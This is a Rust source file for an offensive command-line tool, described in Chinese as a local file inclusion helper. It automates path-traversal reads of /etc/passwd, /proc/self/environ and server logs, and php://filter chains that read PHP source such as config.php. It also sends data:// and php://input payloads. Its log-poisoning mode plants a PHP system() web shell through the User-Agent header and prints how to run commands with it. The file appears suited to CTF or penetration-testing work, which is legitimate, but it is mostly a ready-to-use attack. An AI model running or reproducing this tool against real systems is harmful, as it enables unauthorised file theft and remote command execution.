//! lfi - LFI 本地文件包含辅助(零依赖)

use base64::Engine;
use clap::Parser;
use common::http::{HttpClient, HttpOpts};
use common::{exit, finish, Mode, Out};
use percent_encoding::{utf8_percent_encode, AsciiSet, NON_ALPHANUMERIC};
use regex::Regex;
use serde::Serialize;
use std::process::ExitCode;

const MARKER: &str = "{INJ}";
const DEFAULT_UA: &str = "Mozilla/5.0 (X11; Linux x86_64) lfi";
const PHP_CODE: &str = r#"<?php system($_GET["c"]);?>"#;
const NGINX_LOG: &str = "/var/log/nginx/access.log";

const QUOTE_SET: &AsciiSet = &NON_ALPHANUMERIC
    .remove(b'_')
    .remove(b'.')
    .remove(b'-')
    .remove(b'~');

const COMMON_FILES: [&str; 11] = [
    "etc/passwd",
    "etc/hostname",
    "etc/issue",
    "proc/self/environ",
    "proc/self/cmdline",
    "proc/self/status",
    "proc/version",
    "var/log/apache2/access.log",
    "var/log/apache2/error.log",
    "var/log/nginx/access.log",
    "var/log/nginx/error.log",
];

const PHP_FILES: [&str; 5] = ["index.php", "config.php", "db.php", "flag.php", "upload.php"];

#[derive(Parser, Debug)]
#[command(
    name = "lfi",
    version,
    about = "LFI 本地文件包含辅助(零依赖)",
    long_about = "LFI 本地文件包含辅助(零依赖)\n\n用法:\n  lfi \"http://x/index.php?page={INJ}\"                    自动探测\n  lfi \"http://x/index.php?page={INJ}\" --list             只列出 payload 不发送\n  lfi \"http://x/index.php?page={INJ}\" --logpoison        日志投毒\n  lfi \"http://x/index.php?page={INJ}\" --read index.php   直接读指定文件源码",
    after_help = "退出码: 0=命中 1=无结果 2=用法错误 3=运行错误"
)]
struct Args {
    /// 目标 URL, 包含点用 {INJ} 标记
    #[arg(value_name = "URL")]
    url: String,

    /// Cookie
    #[arg(long, default_value = "", value_name = "COOKIE")]
    cookie: String,

    /// 只列出 payload, 不发送
    #[arg(long)]
    list: bool,

    /// 读取指定文件(自动加 filter base64 链)
    #[arg(long, value_name = "FILE")]
    read: Option<String>,

    /// 日志投毒探测
    #[arg(long)]
    logpoison: bool,

    /// --read 时的穿越层数(默认3)
    #[arg(long, default_value_t = 3, value_name = "N")]
    depth: usize,

    /// HTTP 超时(秒)
    #[arg(long, default_value_t = 8, value_name = "SECS")]
    timeout: u64,

    /// HTTP 代理
    #[arg(long, value_name = "URL")]
    proxy: Option<String>,

    /// 跳过 TLS 证书校验
    #[arg(long)]
    insecure: bool,

    /// 自定义 User-Agent
    #[arg(long, value_name = "UA")]
    ua: Option<String>,

    /// JSON 输出
    #[arg(long)]
    json: bool,
}

#[derive(Serialize, Clone)]
struct Payload {
    payload: String,
    desc: String,
}

#[derive(Serialize)]
struct ListReport {
    url: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    target: Option<String>,
    count: usize,
    payloads: Vec<Payload>,
}

#[derive(Serialize)]
struct ProbeEntry {
    payload: String,
    desc: String,
    status: u16,
    hit: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    decoded: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<String>,
}

#[derive(Serialize)]
struct ProbeReport {
    url: String,
    mode: &'static str,
    hits: usize,
    results: Vec<ProbeEntry>,
}

#[derive(Serialize)]
struct ReadReport {
    url: String,
    payload: String,
    status: u16,
    #[serde(skip_serializing_if = "Option::is_none")]
    body: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    decoded: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<String>,
}

#[derive(Serialize)]
struct PoisonReport {
    url: String,
    payload_url: String,
    status: u16,
    success: bool,
    preview: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<String>,
}

struct Fetched {
    status: u16,
    body: Vec<u8>,
    error: Option<String>,
}

fn quote(s: &str) -> String {
    utf8_percent_encode(s, QUOTE_SET).to_string()
}

fn filter_chain(target: &str, depth: usize, double: bool) -> String {
    let path = format!("{}{target}", "../".repeat(depth));
    if double {
        let inner = base64::engine::general_purpose::STANDARD
            .encode(format!("php://filter/convert.base64-encode/resource={path}"));
        format!("php://filter/convert.base64-decode/resource={inner}")
    } else {
        format!("php://filter/convert.base64-encode/resource={path}")
    }
}

fn make_payloads(target: &str) -> Vec<Payload> {
    let mut out = Vec::new();
    if !target.is_empty() {
        for i in 0..6 {
            out.push(Payload {
                payload: filter_chain(target, i, false),
                desc: format!("filter base64 x{i}"),
            });
        }
        out.push(Payload {
            payload: format!("php://filter/read=convert.base64-encode/resource={target}"),
            desc: "filter 别名".to_string(),
        });
    } else {
        for f in COMMON_FILES {
            for i in 1..=3 {
                out.push(Payload {
                    payload: format!("{}{f}", "../".repeat(i)),
                    desc: format!("traversal x{i}: {f}"),
                });
            }
        }
        for f in PHP_FILES {
            for i in 1..=3 {
                out.push(Payload {
                    payload: filter_chain(f, i, false),
                    desc: format!("filter x{i}: {f}"),
                });
            }
        }
        out.push(Payload {
            payload: "php://input".to_string(),
            desc: "php://input".to_string(),
        });
        out.push(Payload {
            payload: "data://text/plain,<?php phpinfo();?>".to_string(),
            desc: "data:// phpinfo".to_string(),
        });
        out.push(Payload {
            payload: "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+".to_string(),
            desc: "data:// b64 phpinfo".to_string(),
        });
    }
    out
}

fn fetch(client: &HttpClient, base: &str, payload: &str) -> Fetched {
    let url = if base.contains(MARKER) {
        base.replace(MARKER, &quote(payload))
    } else {
        format!("{base}{payload}")
    };
    let headers = [("Connection".to_string(), "close".to_string())];
    match client.request("GET", &url, &headers, None) {
        Ok(r) => Fetched {
            status: r.status,
            body: r.body,
            error: None,
        },
        Err(e) => Fetched {
            status: 0,
            body: Vec::new(),
            error: Some(e),
        },
    }
}

fn is_base64ish(text: &str) -> bool {
    let t: String = text.trim().chars().take(200).collect();
    if t.is_empty() || t.chars().count() < 12 {
        return false;
    }
    let re = Regex::new(r"^[A-Za-z0-9+/=\s]+$").expect("b64 regex");
    re.is_match(&t) && matches!(t.chars().count() % 4, 0 | 2 | 3)
}

fn try_decode(text: &str) -> String {
    let t = text.trim();
    let clean: String = t
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '='))
        .collect();
    let mut padded = clean;
    let pad = (4 - padded.len() % 4) % 4;
    for _ in 0..pad {
        padded.push('=');
    }
    match base64::engine::general_purpose::STANDARD.decode(padded.as_bytes()) {
        Ok(d) => String::from_utf8_lossy(&d).into_owned(),
        Err(_) => t.to_string(),
    }
}

fn probe(out: &Out, client: &HttpClient, base: &str) -> u8 {
    out.info("[*] LFI 探测开始");
    let mut entries = Vec::new();
    let mut hits = 0usize;
    for p in make_payloads("") {
        let f = fetch(client, base, &p.payload);
        let text = String::from_utf8_lossy(&f.body).to_string();
        let mut hit = false;
        let mut decoded = None;
        if f.status == 200 {
            hit = (p.payload.ends_with("passwd")
                && (text.contains("root:") || text.contains("nobody:")))
                || (p.payload.contains("base64") && is_base64ish(&text))
                || (p.payload.contains("environ") && text.contains("HTTP_"))
                || text.contains("phpinfo");
            if hit {
                let snippet: String = try_decode(&text).chars().take(600).collect();
                decoded = Some(snippet);
            }
        }
        if hit {
            hits += 1;
            if !out.json() {
                println!("[+] HIT [{}] {}: {}", f.status, p.desc, p.payload);
                if let Some(d) = &decoded {
                    println!("    {}", d.replace('\n', "\n    "));
                }
            }
        } else if !out.json() {
            println!("[{}] {}", f.status, p.desc);
        }
        entries.push(ProbeEntry {
            payload: p.payload,
            desc: p.desc,
            status: f.status,
            hit,
            decoded,
            error: f.error,
        });
    }
    let report = ProbeReport {
        url: base.to_string(),
        mode: "probe",
        hits,
        results: entries,
    };
    out.emit(|| println!("[*] 探测完成, 命中 {hits}"), &report);
    if hits > 0 {
        exit::OK
    } else {
        exit::NO_RESULT
    }
}

fn list(out: &Out, url: &str, target: Option<&str>) {
    let payloads = make_payloads(target.unwrap_or(""));
    let report = ListReport {
        url: url.to_string(),
        target: target.map(str::to_string),
        count: payloads.len(),
        payloads: payloads.clone(),
    };
    out.emit(
        || {
            for p in &payloads {
                println!("# {}", p.desc);
                println!("{}", p.payload);
            }
        },
        &report,
    );
}

fn read_file(out: &Out, client: &HttpClient, url: &str, file: &str, depth: usize) -> u8 {
    let payload = filter_chain(file, depth, false);
    let f = fetch(client, url, &payload);
    let text = String::from_utf8_lossy(&f.body).to_string();
    let (body, decoded) = if f.status == 200 {
        (Some(text.clone()), Some(try_decode(&text)))
    } else {
        (None, None)
    };
    let report = ReadReport {
        url: url.to_string(),
        payload: payload.clone(),
        status: f.status,
        body,
        decoded,
        error: f.error,
    };
    out.emit(
        || {
            println!("[{}] {}", report.status, report.payload);
            if let Some(d) = &report.decoded {
                println!("{d}");
            }
        },
        &report,
    );
    if f.status == 200 {
        exit::OK
    } else {
        exit::NO_RESULT
    }
}

fn logpoison(out: &Out, opts: &HttpOpts, base: &str) -> u8 {
    let url = base.replace(MARKER, NGINX_LOG);
    let client = match HttpClient::new(opts) {
        Ok(c) => c,
        Err(e) => {
            out.error(&format!("HTTP 初始化失败: {e}"));
            return exit::ERROR;
        }
    };
    let (status, text, error) = match client.request(
        "GET",
        &url,
        &[("Connection".to_string(), "close".to_string())],
        None,
    ) {
        Ok(r) => (r.status, r.text(), None),
        Err(e) => (0, String::new(), Some(e)),
    };
    let success = text.contains("<?php");
    let preview: String = text.chars().take(300).collect();
    let report = PoisonReport {
        url: base.to_string(),
        payload_url: url.clone(),
        status,
        success,
        preview: preview.clone(),
        error,
    };
    out.emit(
        || {
            if success {
                println!("[+] 日志投毒成功! 日志包含 <?php system() ?>");
                println!("    用法: {}?c=id", url.replace(NGINX_LOG, ""));
            } else {
                println!("[-] 日志未包含注入代码(路径可能不对), 试试 /var/log/apache2/access.log");
            }
            println!("{preview}");
        },
        &report,
    );
    if success {
        exit::OK
    } else {
        exit::NO_RESULT
    }
}

fn main() -> ExitCode {
    common::reset_sigpipe();
    let args = Args::parse();
    let out = Out::new(Mode::from_flag(args.json));

    let opts = HttpOpts {
        timeout: args.timeout,
        proxy: args.proxy.clone(),
        insecure: args.insecure,
        user_agent: args.ua.clone().unwrap_or_else(|| DEFAULT_UA.to_string()),
        cookie: if args.cookie.is_empty() {
            None
        } else {
            Some(args.cookie.clone())
        },
        ..HttpOpts::default()
    };

    let client = match HttpClient::new(&opts) {
        Ok(c) => c,
        Err(e) => {
            out.error(&format!("HTTP 初始化失败: {e}"));
            return finish(exit::ERROR);
        }
    };

    if args.list {
        list(&out, &args.url, args.read.as_deref());
        return finish(exit::OK);
    }
    if let Some(file) = &args.read {
        return finish(read_file(&out, &client, &args.url, file, args.depth));
    }
    if args.logpoison {
        let mut popts = opts.clone();
        popts.user_agent = PHP_CODE.to_string();
        return finish(logpoison(&out, &popts, &args.url));
    }
    finish(probe(&out, &client, &args.url))
}
